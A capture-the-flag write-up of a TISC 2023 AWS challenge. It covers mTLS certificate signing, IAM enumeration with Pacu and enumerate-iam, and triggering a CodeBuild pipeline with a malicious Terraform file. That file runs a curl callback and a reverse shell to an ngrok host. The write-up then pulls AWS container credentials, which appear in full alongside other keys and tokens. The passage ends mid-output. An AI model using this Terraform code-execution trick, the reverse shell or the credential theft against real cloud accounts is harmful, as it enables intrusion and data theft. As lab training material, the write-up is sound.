> [https://d3mg5a7c6anwbv.cloudfront.net/](https://d3mg5a7c6anwbv.cloudfront.net/)
> 
> Note: Concatenate flag1 and flag2 to form the flag for submission.
 

Initially I had decided against making writeups for this challenge as I had only gotten a partial solve, but decided to revisit this as I felt I learnt some new things along the way, as I came into the cloud challenge with absolutely no knowledge of cloud pentesting.

Upon visiting the challenge, we would be presented with images of cute cats, such as these: (surprisingly i had saved only the images of the cats, but not the landing page of the challenge, hahaha)

![lvl-7-1](img/lvl-7-1.png)

Very cute!! This was most definitely the highlight of the challenge.

We were presented with two links, one to request for AWS credentials, and another at `<REDACTED>.execute-api.ap-southeast-1.amazonaws.com/development/generate`
 which which generated and provided us with two sets of links, one which was for CSR and another for CRT. The format of the link was as follows, which is also a signed URL. This provides us with limited access to the `devsecmeow2023certs` bucket.

```python
https://devsecmeow2023certs.s3.amazonaws.com/1695560718-12bc197ddac04bc2aba563ccdc2300ed/client.csr?AWSAccessKeyId=ASIATMLSTF3N2DCCYAPO&Signature=DUqCVI8Y7z5fH0ZccG2CywmDHNU%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEE0aDmFwLXNvdXRoZWFzdC0xIkgwRgIhAJWNq42tkXix8kp3jvoIGNNOHFOql%2Bp17kJ8YRqKOEtzAiEA7sz%2FYcczE8ZGHSx7%2BrKib%2BVoFOZK0ToJUGrtdAGGn0gqkAMIRhAAGgwyMzI3MDU0Mzc0MDMiDPgdsASFLPDTPMBY8SrtAtvL8W1VAwmkgoHg6e5vloRu13JuaNo4Fc90rEyXyYo0orkqfgIRnOZVfkjE7fBMtg2%2Bhu3IDSxVRUvKY58QwYG76Yv6GRuu7b3r%2BM7nfZQREdXN0CMSQllF7jyKXJ%2BX2P3lZnbG9sBoco6ElFczbpsh2VmHiqS%2BmH9P08NBOeU%2FqIaXoXSGtyQfLFbx5ieDl9N%2F6rU6XygPaQLlFggQCEhn9k%2FMoICdPe7WyTT%2BBGxypQxcsWcGjP%2FSWxdPXQRUdEbzQp8W%2F8RPQIPpVxeWNBxlg3tKQvrWersLrsBvW1zlSQQ83wLlATgoCO%2BO0oX5odzk9%2FaCEhatgdWZBC9iAfdOWaVMXuPh%2Fj6Zp72VHpGgDk1%2FgxU6YR9BgR7GERrPMiy82qf3KrjPvbwnojcK4XNpsu11zfXH3kzQn7HJ2Dg7%2BjNfxcSV%2BKqZtKPZaSP2WA6WvgGW3PRYtFcyt4UmheCzA3xi1PG%2Bavln7kWwMMLhwKgGOpwBzIFtk6B4QZbvTueJsSdISW4D2rBdhu2LlHVeoPvwE6ILocNE1vAP2YvfuCLREvyImH19mRhh2Eldi41b%2B%2Bs0mKt3g4yjW5wag8PRjChiEUELhXpeibGNIEUMlscLH4FmSX%2Bj2a2iKBWXw77ttcfxNm0rdJBWBVVRWIk7w%2BRfqOe%2F%2BlhqtPPzXF1p3CWzxYHa%2Br4pY8gNfmlYKQ07&Expires=1695561318
```

I tried probing around the links, and the only allowed methods was `PUT` for the CSR and `GET` for the CRT links. After researching a bit more about MTLS, I figured that we had to generate our own CSR to be signed by the server’s CA, then download the CRT from the server. Won’t go into too much detail, but here’s how you would authenticate to the server:

First generate the keys and the CSR, then upload it to the bucket:

```python
openssl genpkey -algorithm RSA -out client.key
openssl req -new -key client.key -out client.csr

curl -v --upload-file client.csr 'CSR LINK'
curl 'CSR LINK' > client.crt
```

Afterwards, we would be able to download the signed CRT. Authenticating to the endpoint, we would be presented with a set of temporary credentials.

```python
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/7]
└─$ curl https://13.213.29.24/ --cert client.crt --key client.key --insecure
{"Message": "Hello new agent, use the credentials wisely! It should be live for the next 120 minutes! Our antivirus will wipe them out and the associated resources after the expected time usage.", "Access_Key": "AKIATMLSTF3NXDVUDADH", "Secret_Key": "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"}
```

> some stuff like the agent-id may not always fully match up, as i did the enumeration over multiple sessions - in fact, most of this challenge was just spent on enumeration, trying to piece together different information to exploit!
> 

Enumerating the permissions on our user, we only had access certain AWS commands.

`aws iam get-policy-version --policy-arn arn:aws:iam::232705437403:policy/agent-0ce1537e40e446d28cfa909c95e9057d --version-id v1`

Some interesting things to note is that we had access to codebuild, codepipeline, and our user has `PutObject` permission on the `devsecmeow2023zip` bucket. 

```python
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "ssm:DescribeParameters",
                        "iam:GetPolicyVersion",
                        "iam:List*Policies",
                        "iam:Get*Policy",
                        "kms:ListKeys",
                        "events:ListRules",
                        "events:DescribeRule",
                        "kms:GetKeyPolicy",
                        "codepipeline:ListPipelines",
                        "codebuild:ListProjects",
                        "iam:ListRoles",
                        "codebuild:BatchGetProjects"
                    ],
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": "arn:aws:iam::232705437403:user/${aws:username}"
                },
                {
                    "Sid": "VisualEditor3",
                    "Effect": "Allow",
                    "Action": [
                        "codepipeline:GetPipeline"
                    ],
                    "Resource": "arn:aws:codepipeline:ap-southeast-1:232705437403:devsecmeow-pipeline"
                },
                {
                    "Sid": "VisualEditor4",
                    "Effect": "Allow",
                    "Action": [
                        "s3:PutObject"
                    ],
                    "Resource": "arn:aws:s3:::devsecmeow2023zip/*"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2023-09-26T01:44:37+00:00"
    }
}
```

Alternatively, we could have also used enumerate-iam, as it would brute force every single permission to check if it could be run by our current user. This would be useful if we didn’t have iam permissions to list our permissions or get our own policy.

```jsx
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/7]
└─$ ./enumerate-iam.py --access-key 'AKIATMLSTF3NXDVUDADH' --secret-key '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' --region 'ap-southeast-1'
2023-09-24 20:25:28,239 - 1203636 - [INFO] Starting permission enumeration for access-key-id "AKIATMLSTF3NXDVUDADH"
2023-09-24 20:25:31,274 - 1203636 - [INFO] -- Account ARN : arn:aws:iam::232705437403:user/agent-ede94254222a4091b6322e748f365955
2023-09-24 20:25:31,274 - 1203636 - [INFO] -- Account Id  : 232705437403
2023-09-24 20:25:31,274 - 1203636 - [INFO] -- Account Path: user/agent-ede94254222a4091b6322e748f365955
2023-09-24 20:25:31,793 - 1203636 - [INFO] Attempting common-service describe / list brute force.
2023-09-24 20:25:34,887 - 1203636 - [INFO] -- codepipeline.list_pipelines() worked!
2023-09-24 20:25:35,217 - 1203636 - [INFO] -- sts.get_caller_identity() worked!
2023-09-24 20:25:35,363 - 1203636 - [INFO] -- iam.list_roles() worked!
2023-09-24 20:25:35,477 - 1203636 - [INFO] -- events.list_rules() worked!
2023-09-24 20:25:35,573 - 1203636 - [INFO] -- sts.get_session_token() worked!
2023-09-24 20:25:36,440 - 1203636 - [INFO] -- codebuild.list_projects() worked!
2023-09-24 20:25:40,519 - 1203636 - [INFO] -- iam.list_policies() worked!
2023-09-24 20:25:45,253 - 1203636 - [INFO] -- dynamodb.describe_endpoints() worked!
2023-09-24 20:25:52,014 - 1203636 - [INFO] -- kms.list_keys() worked!
```

There is an existing codebuild project. I used both aws commands as well as Pacu for the bulk of my enumeration

`aws codebuild list-projects`

```python
{
    "projects": [
        "devsecmeow-build"
    ]
}
```

output from Pacu also shows more information about the `devsecmeow-build` project. (which alternatively we could have gotten from doing `aws get-batch-projects` since our policy allowed for the `codebuild:BatchGetProjects` permission).

- from here, we can see the codepipeline:
    - which would just download terraform and run `terraform init` and `terraform plan`
    - this opens up the possibility of us putting in our own terraform configuration files, which would be run by the pipeline
- at the same time, we can see that flag1 is stored as an environmental variable.

```python
CodeBuild: {
    "EnvironmentVariables": [
        {
            "name": "flag1",
            "value": "/devsecmeow/build/password",
            "type": "PARAMETER_STORE"
        }
    ],
    "Projects": [
        {
            "name": "devsecmeow-build",
            "arn": "arn:aws:codebuild:ap-southeast-1:232705437403:project/devsecmeow-build",
            "source": {
                "type": "CODEPIPELINE",
                "buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n      - env\n      - cd /usr/bin\n      - curl -s -qL -o terraform.zip https://releases.hashicorp.com/terraform/1.4.6/terraform_1.4.6_linux_amd64.zip\n      - unzip -o terraform.zip\n      - cd \"$CODEBUILD_SRC_DIR\"\n      - ls -la \n      - terraform init \n      - terraform plan\n"
            },
            "artifacts": {
                "type": "CODEPIPELINE",
                "name": "devsecmeow-build",
                "packaging": "NONE"
            },
            "cache": {
                "type": "NO_CACHE"
            },
            "environment": {
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/amazonlinux2-x86_64-standard:5.0",
                "computeType": "BUILD_GENERAL1_SMALL",
                "environmentVariables": [
                    {
                        "name": "flag1",
                        "value": "/devsecmeow/build/password",
                        "type": "PARAMETER_STORE"
                    }
                ],
                "imagePullCredentialsType": "CODEBUILD"
            },
            "serviceRole": "arn:aws:iam::232705437403:role/codebuild-role",
            "timeoutInMinutes": 15,
            "queuedTimeoutInMinutes": 480,
            "encryptionKey": "arn:aws:kms:ap-southeast-1:232705437403:alias/aws/s3",
            "created": "Fri, 21 Jul 2023 11:05:13",
            "lastModified": "Fri, 21 Jul 2023 11:05:13",
            "logsConfig": {
                "cloudWatchLogs": {
                    "status": "ENABLED",
                    "groupName": "devsecmeow-codebuild-logs",
                    "streamName": "log-stream"
                },
                "s3Logs": {
                    "status": "DISABLED"
                }
            },
            "projectVisibility": "PRIVATE"
        }
    ]
}
```

Enumerating further, we would actually find an event rule which would trigger this pipeline.

`aws codepipeline list-pipelines`

```python
{
    "pipelines": [
        {
            "name": "devsecmeow-pipeline",
            "version": 1,
            "created": "2023-07-21T11:05:14.065000-04:00",
            "updated": "2023-07-21T11:05:14.065000-04:00"
        }
    ]
}
```

Looking at the rule, it would be triggered once we upload a `rawr.zip` to the `devsecmeow2023zip` bucket.

`aws events list-rules`

```python
{
    "Rules": [
        {
            "Name": "cleaner_invocation_rule",
            "Arn": "arn:aws:events:ap-southeast-1:232705437403:rule/cleaner_invocation_rule",
            "State": "ENABLED",
            "Description": "Scheduled resource cleaning",
            "ScheduleExpression": "rate(15 minutes)",
            "EventBusName": "default"
        },
        {
            "Name": "codepipeline-trigger-rule",
            "Arn": "arn:aws:events:ap-southeast-1:232705437403:rule/codepipeline-trigger-rule",
            "EventPattern": "{\"detail\":{\"eventName\":[\"PutObject\",\"CompleteMultipartUpload\",\"CopyObject\"],\"eventSource\":[\"s3.amazonaws.com\"],\"requestParameters\":{\"bucketName\":[\"devsecmeow2023zip\"],\"key\":[\"rawr.zip\"]}},\"detail-type\":[\"AWS API Call via CloudTrail\"],\"source\":[\"aws.s3\"]}",
            "State": "ENABLED",
            "Description": "Amazon CloudWatch Events rule to automatically start your pipeline when a change occurs in the Amazon S3 object key or S3 folder. Deleting this may prevent changes from being detected in that pipeline. Read more: http://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-about-starting.html",
            "EventBusName": "default"
        }
    ]
}
```

At this point I had pretty much the rough direction on how i should be able to get to flag1. I had to trigger the codepipeline and get it to run my own terraform configuration in `rawr.zip`!

We can upload to the bucket with the following:

```python
Pacu (c:AKIATMLSTF3N646244GK) > aws s3 cp rawr.zip s3://devsecmeow2023zip/rawr.zip
upload: ./rawr.zip to s3://devsecmeow2023zip/rawr.zip
```

After researching further on terraform’s syntax, and possible ways to exec commands. I found that i could actually get a request back to my webhook with the following:

`main.tf`

```python
data "external" "example" {
  program = ["sh", "-c", "curl https://webhook.site/52ea86ca-ad8c-40fb-bd20-23bbbd2c2696"]
}
```

![lvl-7-2](img/lvl-7-2.png)

With this, it confirms that we can get RCE. All that was left was to spin up ngrok and get a connection via a reverse shell.

`main.tf`

```python
data "external" "example" {
  program = ["sh", "-c", "sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/11553 0>&1"]
}
```

After uploading the file to trigger the pipeline, we get a connection back.

```python
┌──(wayell㉿wayell)-[~/Desktop/CTF/2023/TISC2023/7]
└─$ rlwrap nc -lvnp 5544
listening on [any] 5544 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50318
sh: cannot set terminal process group (1): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.2# whoami
whoami
root
```

Listing the environmental variables, we get the first part of the flag: `flag1=TISC{pr0tecT_`

```python
sh-5.2# env
env
MAVEN_DOWNLOAD_SHA512=900bdeeeae550d2d2b3920fe0e00e41b0069f32c019d566465015bdd1b3866395cbe016e22d95d25d51d3a5e614af2c83ec9b282d73309f644859bbad08b63db
NUGET_XMLDOC_MODE=skip
DOCKER_VERSION=23.0.6
RBENV_SRC_DIR=/usr/local/rbenv
CODEBUILD_INITIATOR=codepipeline/devsecmeow-pipeline
AWS_EXECUTION_ENV=AWS_ECS_EC2
JDK_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
CODEBUILD_SRC_DIR=/codebuild/output/src436416888/src
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/b5450488-fe22-4393-99bf-cdf70197c9b2
HOSTNAME=d7d5ed54cc12
JRE_17_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
JAVA_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
DOTNET_ROOT=/root/.dotnet
JRE_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
GRADLE_PATH=/gradle
JAVA_17_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
POWERSHELL_DOWNLOAD_SHA=E85D5544E13A924F8B2C4A5DC2D43ABE46E46633F89E8D138D39C0AAEACB9976
GITVERSION_VERSION=5.12.0
AWS_DEFAULT_REGION=ap-southeast-1
DOCKER_BUILDX_VERSION=0.11.0
AWS_REGION=ap-southeast-1
PLUGIN_MAX_PORT=25000
CODEBUILD_BUILD_IMAGE=aws/codebuild/amazonlinux2-x86_64-standard:5.0
PWD=/codebuild/output/src436416888/src
ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/1948866c-4f5c-40da-a145-4338e5e2bf73
CODEBUILD_KMS_KEY_ID=arn:aws:kms:ap-southeast-1:232705437403:alias/aws/s3
CODEBUILD_GOPATH=/codebuild/output/src436416888
N_SRC_DIR=/n
JDK_17_HOME=/usr/lib/jvm/java-17-amazon-corretto.x86_64
POWERSHELL_VERSION=7.3.4
CODEBUILD_ACTION_RUNNER_URL=https://codefactory-ap-southeast-1-prod-default-build-agent-executor.s3.ap-southeast-1.amazonaws.com/cawsrunner.zip
CODEBUILD_PROJECT_UUID=5be95a1e-7b67-4676-806e-1e573ff14d9e
MAVEN_VERSION=3.9.2
PHP_82_VERSION=8.2.7
CODEBUILD_BUILD_ID=devsecmeow-build:3d7d4283-d5b3-43c2-8474-8e732bddf7df
HOME=/root
CODEBUILD_CI=true
GRADLE_VERSION=8.1.1
DOCKER_CHANNEL=stable
RUBY_32_VERSION=3.2.2
PLUGIN_MIN_PORT=10000
CODEBUILD_RESOLVED_SOURCE_VERSION=I1F18dvJ4SPx74WfQA9hOszHHAn2e2U8
CODEBUILD_AGENT_ENDPOINT=http://127.0.0.1:7831
CODEBUILD_LAST_EXIT=0
GRADLE_DOWNLOADS_SHA256=5625a0ae20fe000d9225d000b36909c7a0e0e8dda61c19b12da769add847c975 8.1.1
CODEBUILD_BUILD_ARN=arn:aws:codebuild:ap-southeast-1:232705437403:build/devsecmeow-build:3d7d4283-d5b3-43c2-8474-8e732bddf7df
PLUGIN_CLIENT_CERT=-----BEGIN CERTIFICATE-----
MIICTzCCAbGgAwIBAgIRAPsKhL7EsdvTAq6LmbDwM9owCgYIKoZIzj0EAwQwKDES
MBAGA1UEChMJSGFzaGlDb3JwMRIwEAYDVQQDEwlsb2NhbGhvc3QwIBcNMjMwOTI2
MDcyMTE5WhgPMjA1MzA5MjUxOTIxNDlaMCgxEjAQBgNVBAoTCUhhc2hpQ29ycDES
MBAGA1UEAxMJbG9jYWxob3N0MIGbMBAGByqGSM49AgEGBSuBBAAjA4GGAAQAqWpG
qM6TT6UFEZT5m/6o9pG1krMiElCGxm5UjAeQuNb2wkP6pfvYydwEQNgrLNVqKsXt
H3B0p7/yJguC4sImmZEA8oo06wG/GaKc7JlusTg+Z44S55y9V0ENguWoHePr2Yam
5cboubuwh8n6mFdEOcrkUHTY9WjF5Q1yKw1+BrxnTBqjdzB1MA4GA1UdDwEB/wQE
AwICrDAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDwYDVR0TAQH/BAUw
AwEB/zAdBgNVHQ4EFgQUjdjvsNJ38R+kEvbxbA1GZ+NNg+swFAYDVR0RBA0wC4IJ
bG9jYWxob3N0MAoGCCqGSM49BAMEA4GLADCBhwJBdIs+MSGiYv+PaVM4OrpZCcwn
V0SmtV4tQ7mfopcVj+2PTYzm/uEVk0xq0fHXFTIXenn6ca8h8aI9LY1pLvPLHukC
QgFVjg73x1QIAS/iUXFWZFU4wYcW0uyvUnR6+Gm2kjEH5Z3LfFuT6zQnE9Ws2OGC
37hHeSx1e3rxCRD4aS34CgFTVw==
-----END CERTIFICATE-----

ANT_DOWNLOAD_SHA512=de4ac604629e39a86a306f0541adb3775596909ad92feb8b7de759b1b286417db24f557228737c8b902d6abf722d2ce5bb0c3baa3640cbeec3481e15ab1958c9
ANT_VERSION=1.10.13
PLUGIN_PROTOCOL_VERSIONS=6,5
PYTHON_311_VERSION=3.11.4
flag1=TISC{pr0tecT_
DOCKER_SHA256=544262F4A3621222AFB79960BFAD4D486935DAB80893478B5CC9CF8EBAF409AE
PYYAML_VERSION=5.4.1
CODEBUILD_BUILD_NUMBER=605
DOCKER_COMPOSE_VERSION=2.17.3
ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/1948866c-4f5c-40da-a145-4338e5e2bf73
MAVEN_HOME=/opt/maven
SHLVL=4
GOENV_DISABLE_GOPATH=1
CODEBUILD_LOG_PATH=log-stream/3d7d4283-d5b3-43c2-8474-8e732bddf7df
PYTHON_PIP_VERSION=23.1.2
SBT_VERSION=1.8.3
CODEBUILD_EXECUTION_ROLE_BUILD=
CODEBUILD_SOURCE_VERSION=arn:aws:s3:::devsecmeow2023zip/devsecmeow-pipeline/source_out/XqDUDFw.zip
CODEBUILD_BUILD_URL=https://ap-southeast-1.console.aws.amazon.com/codebuild/home?region=ap-southeast-1#/builds/devsecmeow-build:3d7d4283-d5b3-43c2-8474-8e732bddf7df/view/new
CODEBUILD_FE_REPORT_ENDPOINT=https://codebuild.ap-southeast-1.amazonaws.com/
DIND_COMMIT=3b5fac462d21ca164b3778647420016315289034
CODEBUILD_BUILD_SUCCEEDING=1
CODEBUILD_BMR_URL=https://CODEBUILD_AGENT:3000
CODEBUILD_AUTH_TOKEN=f89614b9-93c7-451e-8724-7a8c3e28978e
MAVEN_OPTS=-Dmaven.wagon.httpconnectionManager.maxPerRoute=2
RUBY_BUILD_SRC_DIR=/usr/local/rbenv/plugins/ruby-build
DOTNET_60_SDK_VERSION=6.0.410
NODE_18_VERSION=18.16.0
PATH=/usr/local/bin/sbt/bin:/root/.goenv/shims:/root/.goenv/bin:/go/bin:/root/.phpenv/shims:/root/.phpenv/bin:/root/.pyenv/shims:/root/.pyenv/bin:/root/.rbenv/shims:/usr/local/rbenv/bin:/usr/local/rbenv/shims:/root/.dotnet/:/root/.dotnet/tools/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/codebuild/user/bin
CODEBUILD_CONTAINER_NAME=default
DOCKER_BUCKET=download.docker.com
POWERSHELL_DOWNLOAD_URL=https://github.com/PowerShell/PowerShell/releases/download/v7.3.4/powershell-7.3.4-linux-x64.tar.gz
CODEBUILD_START_TIME=1695712891548
GOLANG_20_VERSION=1.20.5
TF_PLUGIN_MAGIC_COOKIE=d602bf8f470bc67ca7faa0386276bbdd4330efaf76d1a219cb4d6991ca9872b2
SBT_DOWNLOAD_SHA256=21F4210786FD68FD15DCA3F4C8EE9CAE0DB249C54E1B0EF6E829E9FA4936423A
OLDPWD=/usr/bin
GOPATH=/go:/codebuild/output/src436416888
_=/usr/bin/env
```

From here, we have actually privilege escalated to the codebuild user. We can even further enumerate the system and get extract AWS credentials as we are in the codebuild container.

The below screenshot is from [https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-codebuild-privesc)

![lvl-7-3](img/lvl-7-3.png)

We can get credentials from the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI. With the credentials, we can do further enumeration.

```python
cat /codebuild/output/tmp/env.sh
<this would give you all the env vars>
sh-5.2# curl http://169.254.170.2/v2/credentials/6c74c19d-2b24-46a0-b63f-fdfb00e99544
<v2/credentials/6c74c19d-2b24-46a0-b63f-fdfb00e99544
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1511  100  1511    0     0  2126k      0 --:--:-- --:--:-- --:--:-- 1475k
{"RoleArn":"AQICAHiXeu3bIBb9heJmFtHPbcbrxVOOY2z+gbh/ZektV0KIkAH3Ds62SaqpjUhKi3msbE1IAAABATCB/gYJKoZIhvcNAQcGoIHwMIHtAgEAMIHnBgkqhkiG9w0BBwEwHgYJYIZIAWUDBAEuMBEEDBqB67vFkp9wW0h50QIBEICBuY2RElK62fRf62mp7/ZJDTa89kfVKgl/agsEvKqEHmrLWSPMXXhNOwNw+D18G2mtXeDgXsmbzXXo4m6b6t2uz2IoMUnFqDnRwnTWf4LCOsVgo4JbzHqcW9yAIIktEHrgoS5G/tjLrjpFDBJXaBXiVomEcQU7TtO6ikdQZ+hkSOqHFDfDV3nrfryWAj50xxIjcRAtU7q79/eua8H9/2Nsj/QfIZRacJ7cCGj7NM4yRlhWsvdUY9eGwxun","AccessKeyId":"ASIATMLSTF3N6UAUM3M4","SecretAccessKey":"ien1ynuZlqfMvyftNHkCkACSGRBm3NEpvGj4dzU5","Token":"IQoJb3JpZ2luX2VjEHgaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAN3HHwBjM/eJMi+iJ1mt4GYMfFO9xx8oF+Uv5CuUJ6sdAiAD9isp2Q4Ohk/oGjQyQ2MSrPq7/AfQAaNRpLfCy42zsCq1AwhxEAAaDDIzMjcwNTQzNzQwMyIMt5SI6IPOIzefWJTlKpIDMZC53lBrKS+yiiUhiEfFdfap64I0NdXjPosOFdhOoON05/3mIdG7qOjNQ8Gg1j5pmZAVIQpqzfB2oWqbQh4p36PtVq+UUq9d8c6tFEopzHsXvk5VC1ggZiw/cuI2hjl6xwEwQ9aFJ/fEuxOjBHyosQ544x//NgcoBdqJCAko0TSrngr/E10mBPbm/z2bS/r2rOf9Qv3Bxbldw4pMjjxRVGL2XQz37ulAO6zIOlvkvEyNOGU3ytEe5MCTiZYjECKjehV72jOM7xBIgjRRO/CQQ6C/5c+5tsrzhzDnWMBd/ISfTKMO929umxGNfK2X5Y+hrNYequmM5k+qRe4ET5FuB+NHz/w76NXqGFK3hP0VvProXP/QUuc9C8tN4yII2Ntu9FMh2VN5Vnq9/M7OiRowkCswCKi8mIaQp7EITURCTXMYVV/81xwXnOzPwGPwz3RqHRNAiosNPyXYtoVZlDevoXHnjzg5nurKEnR5MiV7AVjQwDltUAOQ8DByU6nuKRShi5wOeq3hNNsQBTgVoWhyyMgKMLCYyqgGOpMBD6ZxMFNMbbWZ220qzvalu+DTc4wgbMc5C+1cP6ENoRaopRi0NFjQUAWUqOe4eYnhPE9iSjwVfwcPQUdB73OOhcCOHmFkTq191CiE1B62xg/gWNbQ24Is7tR5RRJmy4z2tf159X1YtLHv3p53qGBoMxHni2Y1/cz5MINrwkm2ld/duco/QBlRGYDKWd311yZOd0f4","Expiration":"2023-09-26T08:45:52Z"}
```

From Pacu we actually can note that there were two EC2 instances:

- 13.213.29.24: this was most definitely the staging system, as we came from here
- 54.255.155.134: this is likely the production system which we had to escalate to

```python
Pacu (codebuild-a:No Keys Set) > data

Session data:
aws_keys: [
    <AWSKey: None>
]
id: 4
created: "2023-09-26 07:47:29.851108"
is_active: true
name: "codebuild-a"
boto_user_agent: "aws-cli/1.16.190 Python/3.7.0 Windows/10 botocore/1.12.180"
access_key_id: "ASIATMLSTF3N6UAUM3M4"
secret_access_key: "******" (Censored)
session_token: "IQoJb3JpZ2luX2VjEHgaDmFwLXNvdXRoZWFzdC0xIkcwRQIhAN3HHwBjM/eJMi+iJ1mt4GYMfFO9xx8oF+Uv5CuUJ6sdAiAD9isp2Q4Ohk/oGjQyQ2MSrPq7/AfQAaNRpLfCy42zsCq1AwhxEAAaDDIzMjcwNTQzNzQwMyIMt5SI6IPOIzefWJTlKpIDMZC53lBrKS+yiiUhiEfFdfap64I0NdXjPosOFdhOoON05/3mIdG7qOjNQ8Gg1j5pmZAVIQpqzfB2oWqbQh4p36PtVq+UUq9d8c6tFEopzHsXvk5VC1ggZiw/cuI2hjl6xwEwQ9aFJ/fEuxOjBHyosQ544x//NgcoBdqJCAko0TSrngr/E10mBPbm/z2bS/r2rOf9Qv3Bxbldw4pMjjxRVGL2XQz37ulAO6zIOlvkvEyNOGU3ytEe5MCTiZYjECKjehV72jOM7xBIgjRRO/CQQ6C/5c+5tsrzhzDnWMBd/ISfTKMO929umxGNfK2X5Y+hrNYequmM5k+qRe4ET5FuB+NHz/w76NXqGFK3hP0VvProXP/QUuc9C8tN4yII2Ntu9FMh2VN5Vnq9/M7OiRowkCswCKi8mIaQp7EITURCTXMYVV/81xwXnOzPwGPwz3RqHRNAiosNPyXYtoVZlDevoXHnjzg5nurKEnR5MiV7AVjQwDltUAOQ8DByU6nuKRShi5wOeq3hNNsQBTgVoWhyyMgKMLCYyqgGOpMBD6ZxMFNMbbWZ220qzvalu+DTc4wgbMc5C+1cP6ENoRaopRi0NFjQUAWUqOe4eYnhPE9iSjwVfwcPQUdB73OOhcCOHmFkTq191CiE1B62xg/gWNbQ24Is7tR5RRJmy4z2tf159X1YtLHv3p53qGBoMxHni2Y1/cz5MINrwkm2ld/duco/QBlRGYDKWd311yZOd0f4"
session_regions: [
    "ap-southeast-1"
]
EC2: {
    "Instances": [
        {
            "ImageId": "ami-0df7a207adb9748c7",
            "InstanceId": "i-02602bf0cf92a4ee1",
            "InstanceType": "t3a.small",
            "LaunchTime": "Mon, 31 Jul 2023 14:50:12",
            "Monitoring": {
                "State": "disabled"
            },
            "Placement": {
                "AvailabilityZone": "ap-southeast-1a",
                "Tenancy": "default"
            },
            "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
            "PrivateIpAddress": "192.168.0.112",
            "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
            "PublicIpAddress": "54.255.155.134",
            "State": {
                "Code": 16,
                "Name": "running"
            },
            "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
            "VpcId": "vpc-063e577d022d3fa3b",
            "Architecture": "x86_64",
            "BlockDeviceMappings": [
                {
                    "DeviceName": "/dev/sda1",
                    "Ebs": {
                        "AttachTime": "Fri, 21 Jul 2023 15:05:29",
                        "DeleteOnTermination": true,
                        "Status": "attached",
                        "VolumeId": "vol-059ce4b405612f51a"
                    }
                }
            ],
            "ClientToken": "terraform-20230721150528288200000009",
            "EnaSupport": true,
            "Hypervisor": "xen",
            "IamInstanceProfile": {
                "Arn": "arn:aws:iam::232705437403:instance-profile/ec2_production",
                "Id": "AIPATMLSTF3N6TTIJTATG"
            },
            "NetworkInterfaces": [
                {
                    "Association": {
                        "IpOwnerId": "amazon",
                        "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
                        "PublicIp": "54.255.155.134"
                    },
                    "Attachment": {
                        "AttachTime": "Fri, 21 Jul 2023 15:05:29",
                        "AttachmentId": "eni-attach-0f142ca01d9f74be8",
                        "DeleteOnTermination": true,
                        "Status": "attached"
                    },
                    "Groups": [
                        {
                            "GroupName": "Generic network for staging and production",
                            "GroupId": "sg-0c178b9e55483a8da"
                        }
                    ],
                    "MacAddress": "02:83:9e:48:11:60",
                    "NetworkInterfaceId": "eni-049d23f49ac0d3c2c",
                    "OwnerId": "232705437403",
                    "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
                    "PrivateIpAddress": "192.168.0.112",
                    "PrivateIpAddresses": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-54-255-155-134.ap-southeast-1.compute.amazonaws.com",
                                "PublicIp": "54.255.155.134"
                            },
                            "Primary": true,
                            "PrivateDnsName": "ip-192-168-0-112.ap-southeast-1.compute.internal",
                            "PrivateIpAddress": "192.168.0.112"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Status": "in-use",
                    "SubnetId": "subnet-0e7baa8cdf3a7fd1b",
                    "VpcId": "vpc-063e577d022d3fa3b",
                    "InterfaceType": "interface"
                }
            ],
            "RootDeviceName": "/dev/sda1",
            "RootDeviceType": "ebs",
            "SecurityGroups": [
                {
                    "GroupName": "Generic network for staging and production",
                    "GroupId": "sg-0c178b9e55483a8da"
                }
            ],
            "SourceDestCheck": true,
            "VirtualizationType": "hvm",
            "CpuOptions": {
                "CoreCount": 1,
                "ThreadsPerCore": 2
            },
            "CapacityReservationSpecification": {
                "CapacityReservationPreference": "open"
            },
            "MetadataOptions": {
                "State": "applied",
                "HttpTokens": "optional",
                "HttpPutResponseHopLimit": 1,
                "HttpEndpoint": "enabled",
                "HttpProtocolIpv6": "disabled",
                "InstanceMetadataTags": "disabled"
            },
            "PlatformDetails": "Linux/UNIX",
